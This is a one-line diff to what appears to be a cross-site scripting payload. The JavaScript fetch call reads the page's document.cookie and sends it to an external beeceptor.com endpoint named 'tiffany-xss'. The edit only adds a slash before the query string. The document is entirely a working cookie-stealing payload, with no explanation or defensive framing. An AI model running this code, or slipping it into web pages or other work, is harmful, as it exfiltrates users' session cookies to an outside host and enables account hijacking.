@@ -1,2 +1,2 @@
-fetch("https://tiffany-xss.free.beeceptor.com?cookie=" + encodeURIComponent(document.cookie));
+fetch("https://tiffany-xss.free.beeceptor.com/?cookie=" + encodeURIComponent(document.cookie));
 
